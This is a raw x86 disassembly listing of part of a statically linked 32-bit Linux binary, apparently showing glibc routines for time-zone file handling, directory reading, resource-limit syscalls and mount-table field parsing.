mov esi, dword [var_4h]
mov eax, str._usr_share_zoneinfo
mov ecx, 0x13
mov edi, eax
repe cmpsb byte [esi], byte ptr es:[edi]
jne 0x808ed28
jmp 0x808ed11
movzx eax, byte [str._etc_localtime]
mov dword [arg_8h], str._etc_localtime
jmp 0x808ed36
mov dword [esp], eax
call fcn.08051180
jmp 0x808ece0
mov dword [var_sp_ch], str.__tzfile_read
mov dword [var_8h], 0x13c
mov dword [var_4h], str.tzfile.c
mov dword [esp], str.num_types__1
call fcn.0805efc0
nop
lea esi, [esi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x18
mov eax, dword [var_4h]
mov dword [esp], eax
call fcn.08053400
mov edx, dword [var_8h]
lea edi, [eax + 1]
mov dword [esp], edx
call fcn.08053400
mov dword [esp], str.posixrules
lea ebx, [eax + 1]
lea eax, [var_10h]
mov dword [var_8h_2], eax
lea eax, [ebx + edi]
mov dword [var_18h_2], eax
mov dword [var_4h_2], eax
call fcn.0808ecc0
mov eax, dword [0x80aad48]
test eax, eax
je 0x808f56e
cmp dword [0x80aaaf0], 1
ja 0x808f576
mov dword [0x80aad48], 0
add esp, 0x18
pop ebx
pop esi
pop edi
leave
ret
mov edx, dword [var_4h]
mov eax, dword [var_10h]
mov dword [var_8h_2], edi
xor esi, esi
mov dword [var_4h_2], edx
mov dword [esp], eax
call fcn.08053740
mov edx, dword [var_8h]
mov dword [esp], eax
mov dword [var_8h_2], ebx
mov dword [var_4h_2], edx
call fcn.08053740
cmp esi, dword [0x80aaae8]
mov eax, dword [var_10h]
mov dword [0x80aaaf0], 2
mov dword [var_14h_2], 0
mov dword [0x80aaaf8], eax
jae 0x808f618
mov ecx, dword [0x80aaaec]
mov eax, dword [0x80aaaf4]
movzx edx, byte [esi + ecx]
lea ebx, [eax + edx*8]
movzx eax, byte [ebx + 4]
mov byte [esi + ecx], al
cmp byte [ebx + 7], 0
jne 0x808f608
mov eax, dword [var_14h_2]
test eax, eax
je 0x808f685
cmp byte [ebx + 6], 0
jne 0x808f685
mov eax, dword [var_64h]
mov edx, dword [0x80aad9c]
sub eax, dword [0x80aab00]
add dword [edx + esi*4], eax
movzx ebx, byte [ebx + 4]
inc esi
cmp esi, dword [0x80aaae8]
mov dword [var_14h_2], ebx
jb 0x808f5c2
mov eax, dword [var_sp_ch]
mov edx, dword [var_64h]
mov dword [0x80aaafc], eax
mov dword [0x80aab00], edx
mov eax, dword [0x80aaaf4]
mov byte [eax + 5], 0
mov edx, dword [var_sp_ch]
mov eax, dword [0x80aaaf4]
mov byte [eax + 4], 0
mov dword [eax], edx
mov edx, edi
mov eax, dword [0x80aaaf4]
mov byte [eax + 0xd], dl
mov edx, dword [var_64h]
mov eax, dword [0x80aaaf4]
mov byte [eax + 0xc], 1
mov dword [eax + 8], edx
mov edx, dword [var_8h]
mov eax, dword [var_4h]
mov dword [0x80a9c2c], edx
mov dword [0x80a9c28], eax
mov eax, dword [0x80aaaf4]
mov eax, dword [eax]
neg eax
mov dword [0x80aaa64], eax
mov eax, dword [var_18h_2]
call fcn.0808f900
jmp 0x808f56e
mov eax, dword [var_sp_ch]
mov edx, dword [0x80aad9c]
sub eax, dword [0x80aaafc]
jmp 0x808f605
lea esi, [esi]
mov ecx, dword [0x80aaae8]
push ebp
mov ebp, esp
push ebx
test ecx, ecx
je 0x808f6b8
mov ebx, dword [0x80aad9c]
cmp eax, dword [ebx]
jge 0x808f6f8
mov eax, dword [0x80aaaf0]
xor edx, edx
cmp edx, eax
jae 0x808f6f0
mov ecx, dword [0x80aaaf4]
cmp byte [ecx + 4], 0
mov ebx, ecx
je 0x808f6e0
inc edx
cmp edx, eax
jae 0x808f6e0
cmp byte [ebx + edx*8 + 4], 0
jne 0x808f6d1
lea esi, [esi]
cmp edx, eax
je 0x808f6ec
mov ebx, dword [esp]
lea eax, [ecx + edx*8]
leave
ret
xor edx, edx
jmp 0x808f6e4
mov ecx, dword [0x80aaaf4]
jmp 0x808f6e0
mov edx, 1
cmp edx, ecx
jae 0x808f70b
cmp eax, dword [ebx + edx*4]
jl 0x808f70b
inc edx
cmp edx, ecx
jb 0x808f701
mov eax, dword [0x80aaaec]
mov ecx, dword [0x80aaaf4]
movzx edx, byte [edx + eax - 1]
jmp 0x808f6e4
lea esi, [esi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x14
mov ecx, dword [arg_ch]
mov edi, dword [arg_8h]
test ecx, ecx
jne 0x808f7cf
mov eax, dword [arg_10h]
mov edx, dword [arg_14h]
mov dword [eax], 0
mov dword [edx], 0
mov ebx, dword [0x80aab04]
nop
dec ebx
cmp ebx, 0xffffffff
je 0x808f76f
mov edx, dword [0x80aab08]
cmp edi, dword [edx + ebx*8]
jl 0x808f750
mov eax, dword [edx + ebx*8 + 4]
mov ecx, dword [arg_10h]
mov dword [ecx], eax
cmp edi, dword [edx + ebx*8]
je 0x808f777
add esp, 0x14
pop ebx
pop esi
pop edi
leave
ret
test ebx, ebx
jne 0x808f7c3
mov eax, dword [edx + 4]
test eax, eax
jle 0x808f7c3
mov eax, dword [arg_14h]
test ebx, ebx
mov dword [eax], 1
je 0x808f76f
mov eax, dword [edx + ebx*8 - 8]
inc eax
cmp dword [edx + ebx*8], eax
jne 0x808f76f
mov eax, dword [edx + ebx*8 - 4]
inc eax
cmp dword [edx + ebx*8 + 4], eax
jne 0x808f76f
mov ecx, dword [arg_14h]
inc dword [ecx]
dec ebx
je 0x808f76f
mov eax, dword [edx + ebx*8 - 8]
inc eax
cmp dword [edx + ebx*8], eax
jne 0x808f76f
mov eax, dword [edx + ebx*8 - 4]
inc eax
cmp dword [edx + ebx*8 + 4], eax
je 0x808f7a4
jmp 0x808f76f
mov eax, dword [edx + ebx*8 - 4]
cmp dword [edx + ebx*8 + 4], eax
jle 0x808f76f
jmp 0x808f782
mov eax, edi
call fcn.0808f6a0
mov ebx, dword [0x80aaae8]
mov dword [0x80a9c2c], 0
mov edx, dword [0x80aaafc]
mov dword [var_10h], eax
mov dword [0x80a9c28], 0
xor eax, eax
cmp edx, dword [0x80aab00]
setne al
neg edx
test ebx, ebx
mov dword [0x80aaa64], edx
mov dword [0x80aaa60], eax
je 0x808f83d
mov eax, dword [0x80aaaec]
dec ebx
movzx edx, byte [ebx + eax]
mov eax, dword [0x80aaaf4]
movzx esi, byte [eax + edx*8 + 4]
movzx eax, byte [eax + edx*8 + 5]
mov edx, dword [esi*4 + 0x80a9c28]
test edx, edx
je 0x808f8aa
test ebx, ebx
jne 0x808f815
mov eax, dword [0x80a9c28]
test eax, eax
jne 0x808f865
cmp dword [0x80aaaf0], 1
jne 0x808f8da
mov eax, dword [0x80aaaf8]
mov dword [esp], eax
call fcn.0808de40
mov dword [0x80a9c28], eax
mov eax, dword [0x80a9c2c]
test eax, eax
jne 0x808f878
mov eax, dword [0x80a9c28]
mov dword [0x80a9c2c], eax
mov edx, dword [var_10h]
mov ecx, dword [arg_18h]
movzx eax, byte [edx + 4]
mov dword [ecx + 0x20], eax
movzx eax, byte [edx + 5]
add eax, dword [0x80aaaf8]
mov dword [esp], eax
call fcn.0808de40
mov ecx, dword [var_10h]
mov edx, dword [arg_18h]
mov dword [edx + 0x28], eax
mov eax, dword [ecx]
mov dword [edx + 0x24], eax
jmp 0x808f737
add eax, dword [0x80aaaf8]
mov dword [esp], eax
call fcn.0808de40
mov dword [esi*4 + 0x80a9c28], eax
mov eax, 1
sub eax, esi
mov eax, dword [eax*4 + 0x80a9c28]
test eax, eax
je 0x808f839
jmp 0x808f83d
mov dword [var_ch], str.__tzfile_compute
mov dword [var_8h], 0x201
mov dword [var_4h], str.tzfile.c
mov dword [esp], str.num_types__1
call fcn.0805efc0
mov esi, esi
mov ecx, dword [0x80aaaf8]
push ebp
mov ebp, esp
push ebx
lea ebx, [eax + ecx]
lea esi, [esi]
cmp byte [ecx], 0
mov eax, ecx
je 0x808f91d
inc ecx
cmp byte [ecx], 0
jne 0x808f917
mov edx, ecx
sub edx, eax
mov eax, dword [0x80aad44]
cmp edx, eax
cmova eax, edx
inc ecx
cmp ecx, ebx
mov dword [0x80aad44], eax
jb 0x808f910
pop ebx
leave
ret
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
sub esp, 8
mov dword [esp], ebx
mov dword [var_4h], esi
mov ebx, str._dev_null
call fcn.08048b20
mov ecx, 0x10800
mov edx, eax
mov esi, dword [eax]
mov eax, 5
int 0x80
cmp eax, 0xfffff000
ja 0x808f9a8
test eax, eax
js 0x808f995
mov ebx, eax
mov eax, 6
int 0x80
mov dword [0x80aab0c], 0xffffffff
call fcn.08048b20
mov dword [eax], esi
mov esi, dword [var_4h]
mov ebx, dword [esp]
leave
ret
xor eax, eax
cmp dword [edx], 0x14
sete al
lea eax, [eax + eax - 1]
mov dword [0x80aab0c], eax
jmp 0x808f985
neg eax
mov dword [edx], eax
mov eax, 0xffffffff
jmp 0x808f96e
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x70
mov ebx, dword [arg_8h]
cmp byte [ebx], 0
je 0x808fb4f
mov eax, dword [0x80aab0c]
test eax, eax
je 0x808fb40
test eax, eax
js 0x808fb00
mov ecx, 0x18800
mov eax, 5
int 0x80
cmp eax, 0xfffff000
mov esi, eax
ja 0x808faed
xor edx, edx
test esi, esi
js 0x808fab4
lea eax, [var_6ch]
mov dword [var_4h], esi
mov dword [esp], 3
mov dword [var_8h], eax
call fcn.08053dc0
test eax, eax
js 0x808fac0
mov eax, dword [0x80aab0c]
test eax, eax
jle 0x808fad8
mov dword [var_8h], 1
mov dword [var_4h], 2
mov dword [esp], esi
call fcn.08054250
test eax, eax
js 0x808fac0
mov eax, dword [var_38h]
mov dword [var_70h], 0x2000
cmp eax, 0x114
cmovb eax, dword [var_70h]
mov dword [var_70h], eax
add eax, 0x30
mov dword [esp], eax
call fcn.08050fe0
test eax, eax
mov ebx, eax
je 0x808fac0
xor eax, eax
mov ecx, 0xc
mov edi, ebx
cld
rep stosd dword es:[edi], eax
lea eax, [ebx + 0x30]
mov dword [ebx], esi
mov dword [ebx + 4], eax
mov eax, dword [var_70h]
mov dword [ebx + 8], eax
mov eax, 0
test eax, eax
je 0x808fab2
lea eax, [ebx + 0x18]
mov dword [var_4h], 0
mov dword [esp], eax
call section.
mov edx, ebx
add esp, 0x70
mov eax, edx
pop ebx
pop esi
pop edi
leave
ret
mov esi, esi
call fcn.08048b20
mov ebx, esi
mov edi, eax
mov edx, dword [eax]
mov eax, 6
int 0x80
mov dword [edi], edx
xor edx, edx
jmp 0x808fab4
mov eax, dword [var_5ch]
and eax, 0xf000
cmp eax, 0x4000
je 0x808fa39
jmp 0x808fac0
neg esi
call fcn.08048b20
mov dword [eax], esi
mov esi, 0xffffffff
jmp 0x808fa03
lea eax, [var_6ch]
mov dword [var_4h], ebx
mov dword [esp], 3
mov dword [var_8h], eax
call fcn.08079600
xor edx, edx
test eax, eax
js 0x808fab4
mov eax, dword [var_5ch]
and eax, 0xf000
cmp eax, 0x4000
je 0x808f9ea
call fcn.08048b20
mov dword [eax], 0x14
jmp 0x808fad4
lea esi, [esi]
call fcn.0808f940
mov eax, dword [0x80aab0c]
jmp 0x808f9e2
call fcn.08048b20
mov dword [eax], 2
jmp 0x808fad4
nop
push ebp
mov ebp, esp
sub esp, 0xc
mov dword [var_8h], ebx
mov dword [var_4h], esi
mov ebx, dword [arg_8h]
test ebx, ebx
je 0x808fbbd
mov eax, 0
mov esi, dword [ebx]
test eax, eax
je 0x808fb89
lea eax, [ebx + 0x18]
mov dword [esp], eax
call section.
mov dword [esp], ebx
mov ebx, esi
call fcn.08051180
mov eax, 6
int 0x80
cmp eax, 0xfffff000
mov esi, eax
ja 0x808fbad
mov eax, esi
mov ebx, dword [var_8h]
mov esi, dword [var_4h]
leave
ret
neg esi
call fcn.08048b20
mov dword [eax], esi
mov esi, 0xffffffff
jmp 0x808fba3
call fcn.08048b20
mov dword [eax], 0x16
mov eax, 0xffffffff
jmp 0x808fba5
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 4
mov esi, dword [arg_8h]
call fcn.08048b20
mov edi, dword [eax]
mov eax, 0
test eax, eax
je 0x808fc27
lea eax, [esi + 0x18]
mov dword [esp], eax
call section.
mov edx, dword [esi + 4]
lea esi, [esi]
mov ecx, dword [esi + 0x10]
cmp ecx, dword [esi + 0xc]
jae 0x808fc6f
lea ebx, [ecx + edx]
movzx eax, word [ebx + 8]
lea eax, [eax + ecx]
mov dword [esi + 0x10], eax
mov eax, dword [ebx + 4]
mov dword [esi + 0x14], eax
mov eax, dword [ebx]
test eax, eax
je 0x808fc30
mov eax, 0
test eax, eax
je 0x808fc65
lea eax, [esi + 0x18]
mov dword [esp], eax
call section.
add esp, 4
mov eax, ebx
pop ebx
pop esi
pop edi
leave
ret
mov ecx, dword [esi + 8]
mov eax, dword [esi]
call fcn.0808fcc0
test eax, eax
mov ebx, eax
jle 0x808fc90
mov dword [esi + 0xc], eax
mov dword [esi + 0x10], 0
xor ecx, ecx
mov edx, dword [esi + 4]
jmp 0x808fc38
jl 0x808fca1
test ebx, ebx
jne 0x808fc9d
call fcn.08048b20
mov dword [eax], edi
xor ebx, ebx
jmp 0x808fc51
call fcn.08048b20
cmp dword [eax], 2
mov eax, 0
cmove ebx, eax
jmp 0x808fc92
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x4c
mov dword [var_1ch], 0xffffffff
mov dword [var_20h], 0xffffffff
mov dword [var_10h], eax
mov dword [var_14h], edx
mov dword [var_18h], ecx
mov eax, dword [0x80aad4c]
test eax, eax
jne 0x808fe67
call fcn.08048b20
mov edx, dword [var_18h_2]
mov ecx, dword [var_14h_2]
mov edi, eax
mov esi, dword [eax]
cmp edx, 0x10c
ja 0x808fd19
mov eax, dword [var_18h_2]
add edx, 8
add eax, 0x1a
and eax, 0xfffffffc
sub esp, eax
lea ecx, [var_1fh]
and ecx, 0xfffffff0
mov ebx, dword [var_10h_2]
mov eax, 0xdc
int 0x80
cmp eax, 0xfffff000
ja 0x808ff96
cmp eax, 0xffffffff
je 0x808fe41
mov edx, dword [var_14h_2]
lea eax, [eax + ecx]
mov edi, ecx
cmp ecx, eax
mov dword [var_3ch], eax
mov dword [var_24h], edx
jb 0x808fd57
mov eax, dword [var_24h]
sub eax, dword [var_14h]
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret
movzx ecx, word [edi + 0x10]
mov dword [var_28h], ecx
sub ecx, 5
and ecx, 0xfffffffc
mov dword [var_2ch], ecx
mov edx, dword [edi + 0xc]
mov eax, dword [edi + 8]
mov ebx, dword [edi]
mov esi, dword [edi + 4]
mov dword [var_34h], eax
mov dword [var_30h], edx
mov eax, dword [var_28h]
movzx edx, byte [edi + 0x12]
sub eax, 0x13
mov dword [var_8h], eax
lea eax, [edi + 0x13]
mov dword [var_4h], eax
mov byte [var_35h], dl
mov eax, dword [var_24h]
add eax, 0xb
mov dword [esp], eax
call fcn.08053690
xor edx, edx
mov ecx, dword [var_24h]
mov eax, dword [var_34h]
mov dword [ecx], ebx
mov dword [ecx + 4], eax
mov eax, dword [ecx]
mov ecx, edx
xor ecx, esi
xor eax, ebx
or ecx, eax
jne 0x808fdfd
mov eax, dword [var_34h]
mov ecx, dword [var_30h]
cdq
xor eax, dword [var_34h]
xor ecx, edx
or ecx, eax
jne 0x808fdfd
mov ecx, dword [var_30h]
mov edx, dword [var_34h]
mov ebx, dword [var_2ch]
mov dword [var_1ch_2], ecx
mov dword [var_20h_2], edx
mov ecx, dword [var_24h]
mov word [ecx + 8], bx
movzx eax, byte [var_35h]
mov byte [ecx + 0xa], al
mov edx, dword [var_2ch]
add edi, dword [var_28h]
add ecx, edx
cmp edi, dword [var_3ch]
mov dword [var_24h], ecx
jb 0x808fd57
jmp 0x808fd49
mov eax, dword [var_20h_2]
and eax, dword [var_1ch_2]
inc eax
je 0x808fe2c
mov edx, dword [var_1ch_2]
mov eax, dword [var_20h_2]
mov dword [var_sp_ch], 0
mov dword [var_8h], edx
mov dword [var_4h], eax
mov edx, dword [var_10h_2]
mov dword [esp], edx
call fcn.08054840
jmp 0x808fd49
call fcn.08048b20
mov dword [eax], 0x4b
mov eax, 0xffffffff
jmp 0x808fd4f
mov edx, dword [edi]
cmp edx, 0x16
je 0x808fe56
cmp edx, 0x26
mov eax, 0xffffffff
jne 0x808fd4f
call fcn.08048b20
mov dword [eax], esi
mov dword [0x80aad4c], 1
mov eax, dword [var_18h]
mov edx, 0x51eb851f
mov ebx, dword [var_10h]
mul edx
mov eax, dword [var_18h]
shr edx, 3
sub eax, edx
mov edx, dword [var_18h]
dec edx
cmp edx, eax
cmova edx, eax
lea eax, [edx + 0x12]
and eax, 0xfffffffc
sub esp, eax
lea ecx, [var_1fh]
and ecx, 0xfffffff0
mov dword [var_48h], ecx
mov eax, 0x8d
int 0x80
cmp eax, 0xfffff000
mov edi, eax
ja 0x808ff83
cmp edi, 0xffffffff
mov eax, 0xffffffff
je 0x808fd4f
add edi, dword [var_48h]
mov esi, dword [var_14h]
cmp dword [var_48h], edi
mov dword [var_40h], edi
jae 0x808ff3d
mov ecx, dword [var_18h]
lea ecx, [ecx + esi]
mov dword [var_44h], ecx
mov ebx, dword [var_48h]
movzx eax, word [ebx + 8]
lea edx, [eax + 4]
and edx, 0xfffffffc
lea edi, [edx + esi]
cmp edi, dword [var_44h]
ja 0x808ff44
mov ecx, dword [var_48h_2]
mov word [esi + 8], dx
mov eax, dword [ecx + 4]
mov dword [var_20h_2], eax
mov ebx, eax
mov eax, dword [ecx]
sar ebx, 0x1f
mov dword [var_1ch_2], ebx
mov dword [esi], eax
mov eax, dword [ecx + 4]
mov byte [esi + 0xa], 0
mov edx, dword [var_48h_2]
mov dword [esi + 4], eax
movzx eax, word [ecx + 8]
lea ecx, [esi + 0xb]
add edx, 0xa
mov dword [esp], ecx
mov esi, edi
mov dword [var_4h], edx
sub eax, 0xa
mov dword [var_8h], eax
call fcn.08053770
mov ecx, dword [var_40h_2]
mov edx, dword [var_48h_2]
movzx eax, word [edx + 8]
add edx, eax
cmp edx, ecx
mov dword [var_48h_2], edx
jb 0x808fed0
mov eax, esi
jmp 0x808fd4c
mov eax, dword [var_20h]
and eax, dword [var_1ch]
inc eax
je 0x808ffa4
mov edx, dword [var_1ch_2]
mov eax, dword [var_20h_2]
mov dword [var_sp_ch], 0
mov dword [var_8h], edx
mov dword [var_4h], eax
mov edx, dword [var_10h_2]
mov dword [esp], edx
call fcn.08054840
cmp esi, dword [var_14h_2]
jne 0x808ff3d
call fcn.08048b20
mov dword [eax], 0x16
jmp 0x808fe37
neg edi
call fcn.08048b20
mov dword [eax], edi
mov edi, 0xffffffff
jmp 0x808feab
neg eax
mov dword [edi], eax
mov eax, 0xffffffff
jmp 0x808fd2e
mov dword [var_sp_ch], str.__getdents
mov dword [var_8h], 0x10f
mov dword [var_4h], str..._sysdeps_unix_sysv_linux_getdents.c
mov dword [esp], str.last_offset____1
call fcn.0805efc0
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
sub esp, 0xbc
mov dword [var_4h], edi
mov dword [var_ch], ebx
mov dword [var_8h], esi
mov edi, dword [arg_8h]
cmp edi, 1
je 0x8090118
mov eax, dword [0x80aad2c]
test eax, eax
jne 0x8090080
lea esi, [var_ach]
mov ebx, dword [arg_ch]
mov ecx, esi
mov eax, 0xc4
int 0x80
cmp eax, 0xfffff000
mov dword [var_b0h], eax
ja 0x80900f6
mov ebx, dword [var_b0h]
test ebx, ebx
je 0x80900dc
cmp ebx, 0xffffffff
je 0x809006a
mov eax, ebx
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov edi, dword [var_4h]
leave
ret
call fcn.08048b20
cmp dword [eax], 0x26
jne 0x809005d
mov dword [0x80aad2c], 1
mov esi, esi
lea esi, [var_4ch]
mov ebx, dword [arg_ch]
mov ecx, esi
mov eax, 0x6b
int 0x80
cmp eax, 0xfffff000
mov dword [var_b0h], eax
ja 0x80900bd
mov ebx, dword [var_b0h]
test ebx, ebx
jne 0x809005d
mov ecx, dword [arg_10h]
mov dword [var_sp_4h], esi
mov dword [esp], edi
mov dword [var_sp_8h], ecx
call fcn.08054300
mov ebx, eax
jmp 0x809005d
call fcn.08048b20
neg dword [var_b0h]
mov edx, dword [var_b0h]
mov dword [var_b0h], 0xffffffff
mov dword [eax], edx
jmp 0x809009c
mov ecx, dword [arg_10h]
mov dword [var_sp_4h], esi
mov dword [esp], edi
mov dword [var_sp_8h], ecx
call fcn.08054500
mov ebx, eax
jmp 0x8090058
call fcn.08048b20
neg dword [var_b0h]
mov edx, dword [var_b0h]
mov dword [var_b0h], 0xffffffff
mov dword [eax], edx
jmp 0x809004a
mov ebx, dword [arg_ch]
mov ecx, dword [arg_10h]
mov eax, 0x6b
int 0x80
cmp eax, 0xfffff000
mov esi, eax
ja 0x8090135
mov eax, esi
jmp 0x809005f
neg esi
call fcn.08048b20
mov dword [eax], esi
mov esi, 0xffffffff
jmp 0x809012e
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebx
mov edx, dword [arg_10h]
mov ecx, dword [arg_ch]
mov ebx, dword [arg_8h]
mov eax, 0x13
int 0x80
pop ebx
cmp eax, 0xfffff001
jae fcn.080564b0
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
sub esp, 0xc
mov eax, dword [0x80aad50]
mov dword [esp], ebx
mov dword [var_4h], esi
mov dword [var_8h], edi
mov ebx, dword [arg_8h]
mov esi, dword [arg_ch]
test eax, eax
jle 0x8090200
mov ecx, esi
mov eax, 0x4c
int 0x80
cmp eax, 0xfffff000
mov ebx, eax
ja 0x80901ed
cmp ebx, 0xffffffff
mov eax, 0xffffffff
je 0x80901cf
cmp dword [esi], 0x7fffffff
je 0x80901e5
cmp dword [esi + 4], 0x7fffffff
je 0x80901dc
mov eax, ebx
mov ebx, dword [esp]
mov esi, dword [var_4h]
mov edi, dword [var_8h]
leave
ret
mov dword [esi + 4], 0xffffffff
jmp 0x80901cd
mov dword [esi], 0xffffffff
jmp 0x80901c4
neg ebx
call fcn.08048b20
mov dword [eax], ebx
mov ebx, 0xffffffff
jmp 0x80901b2
lea esi, [esi]
mov ecx, esi
mov eax, 0xbf
int 0x80
cmp eax, 0xfffff000
mov edi, eax
ja 0x809023e
cmp edi, 0xffffffff
je 0x8090225
mov eax, edi
mov dword [0x80aad50], 0xffffffff
jmp 0x80901cf
call fcn.08048b20
cmp dword [eax], 0x26
jne 0x8090217
mov dword [0x80aad50], 1
jmp 0x80901a0
neg edi
call fcn.08048b20
mov dword [eax], edi
mov edi, 0xffffffff
jmp 0x8090212
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
sub esp, 0x18
mov dword [var_8h], esi
mov dword [var_ch], ebx
mov dword [var_4h], edi
mov esi, dword [arg_ch]
mov edi, esp
mov dword [esp], esi
call fcn.08053400
lea edx, [eax + 0x14]
and edx, 0xfffffffc
sub esp, edx
lea ebx, [var_1bh]
mov dword [var_sp_8h], eax
mov dword [var_sp_4h], esi
and ebx, 0xfffffff0
mov dword [esp], ebx
call fcn.08053740
mov word [eax], 0x63
mov dword [var_sp_4h], ebx
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.0804a250
test eax, eax
mov ebx, eax
je 0x80902e5
mov dword [var_sp_4h], 2
mov dword [esp], eax
call fcn.08076c00
mov eax, ebx
mov esp, edi
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov edi, dword [var_4h]
leave
ret
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
sub esp, 4
mov eax, dword [arg_8h]
test eax, eax
je 0x8090315
mov dword [esp], eax
call fcn.08049dc0
mov eax, 1
leave
ret
lea esi, [esi]
push ebp
mov ebp, esp
push edi
mov edi, dword [arg_8h]
push esi
push ebx
mov edx, edi
mov ecx, edi
lea esi, [esi]
movzx eax, byte [edx]
cmp al, 0x5c
je 0x8090349
mov byte [ecx], al
inc ecx
movzx eax, byte [edx]
inc edx
test al, al
jne 0x8090330
pop ebx
pop esi
mov eax, edi
pop edi
leave
ret
cmp byte [edx + 1], 0x30
je 0x80903b6
cmp al, 0x5c
jne 0x8090337
cmp byte [edx + 1], 0x30
je 0x80903a5
cmp al, 0x5c
jne 0x8090337
cmp byte [edx + 1], 0x30
je 0x8090394
cmp al, 0x5c
jne 0x8090337
movzx esi, byte [edx + 1]
mov ebx, esi
cmp bl, 0x5c
je 0x809038e
mov ebx, esi
cmp bl, 0x31
jne 0x8090337
cmp byte [edx + 2], 0x33
jne 0x8090337
cmp byte [edx + 3], 0x34
jne 0x8090337
mov byte [ecx], 0x5c
inc ecx
add edx, 3
jmp 0x809033a
mov byte [ecx], 0x5c
inc edx
jmp 0x8090339
cmp byte [edx + 2], 0x31
jne 0x8090363
cmp byte [edx + 3], 0x32
jne 0x8090363
mov byte [ecx], 0xa
jmp 0x8090388
cmp byte [edx + 2], 0x31
jne 0x8090359
cmp byte [edx + 3], 0x31
jne 0x8090359
mov byte [ecx], 9
jmp 0x8090388
cmp byte [edx + 2], 0x34
jne 0x809034f
cmp byte [edx + 3], 0x30
jne 0x809034f
mov byte [ecx], 0x20
jmp 0x8090388
mov esi, esi
lea edi, [edi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x414
mov ebx, dword [arg_10h]
mov edi, dword [arg_8h]
cmp word [edi], 0
jns 0x809070e
lea esi, [esi]
mov eax, dword [arg_14h]
mov dword [var_8h], edi
mov dword [esp], ebx
mov dword [var_4h], eax
call fcn.08076c40
test eax, eax
je 0x80906f7
mov dword [var_4h], 0xa
mov dword [esp], ebx
call fcn.08076ce0
test eax, eax
je 0x80906bc
mov byte [eax], 0
movsx eax, byte [ebx]
xor edx, edx
cmp eax, 0x20
je 0x80906a8
cmp eax, 9
je 0x80906a8
lea ecx, [edx + ebx]
mov dword [var_410h], ecx
mov edx, ecx
movzx eax, byte [ecx]
test al, al
je 0x80903f0
cmp al, 0x23
je 0x80903f0
test ecx, ecx
lea esi, [var_410h]
je 0x8090481
movzx eax, byte [edx]
test al, al
je 0x80906a1
cmp al, 0x20
je 0x8090473
cmp al, 9
je 0x8090473
inc edx
jmp 0x809045d
mov byte [edx], 0
inc edx
mov dword [esi], edx
test ecx, ecx
jne 0x8090694
mov eax, 0x80a4f11
mov edx, dword [arg_ch]
mov dword [edx], eax
mov edx, dword [var_410h]
test edx, edx
mov ebx, edx
je 0x80904e1
movsx eax, byte [edx]
xor ecx, ecx
cmp eax, 0x20
je 0x8090680
cmp eax, 9
je 0x8090680
lea edx, [ecx + ebx]
test edx, edx
mov dword [var_410h], edx
je 0x80904e1
mov ecx, edx
movzx eax, byte [ecx]
test al, al
je 0x8090678
cmp al, 0x20
je 0x80904d3
cmp al, 9
je 0x80904d3
inc ecx
jmp 0x80904bd
mov byte [ecx], 0
inc ecx
mov dword [esi], ecx
test edx, edx
jne 0x809066b
mov eax, 0x80a4f11
mov edx, dword [arg_ch]
mov dword [edx + 4], eax
mov edx, dword [var_410h]
test edx, edx
mov ebx, edx
je 0x8090542
movsx eax, byte [edx]
xor ecx, ecx
cmp eax, 0x20
je 0x8090657
cmp eax, 9
je 0x8090657
lea edx, [ecx + ebx]
test edx, edx
mov dword [var_410h], edx
je 0x8090542
mov ecx, edx
movzx eax, byte [ecx]
test al, al
je 0x8090650
cmp al, 0x20
je 0x8090534
cmp al, 9
je 0x8090534
inc ecx
jmp 0x809051e
mov byte [ecx], 0
inc ecx
mov dword [esi], ecx
test edx, edx
jne 0x8090643
mov eax, 0x80a4f11
mov edx, dword [arg_ch]
mov dword [edx + 8], eax
mov edx, dword [var_410h]
test edx, edx
mov ebx, edx
je 0x809059f
movsx eax, byte [edx]
xor ecx, ecx
cmp eax, 0x20
je 0x809062f
cmp eax, 9
je 0x809062f
lea edx, [ecx + ebx]
test edx, edx
mov dword [var_410h], edx
je 0x809059f
mov ecx, edx
movzx eax, byte [ecx]
test al, al
je 0x8090628
cmp al, 0x20
je 0x8090595
cmp al, 9
je 0x8090595
inc ecx
jmp 0x809057f
mov byte [ecx], 0
inc ecx
mov dword [esi], ecx
test edx, edx
jne 0x809061b
mov eax, 0x80a4f11
mov edx, dword [arg_ch]
mov dword [edx + 0xc], eax
xor eax, eax
mov edx, dword [var_410h]
test edx, edx
jne 0x80905f5
cmp eax, 1
je 0x80905e9
jle 0x80905db
cmp word [edi], 0
jns 0x80905d1
mov eax, dword [arg_ch]
add esp, 0x414
pop ebx
pop esi
pop edi
leave
ret
mov dword [esp], edi
call fcn.08074580
jmp 0x80905c3
test eax, eax
jne 0x80905bd
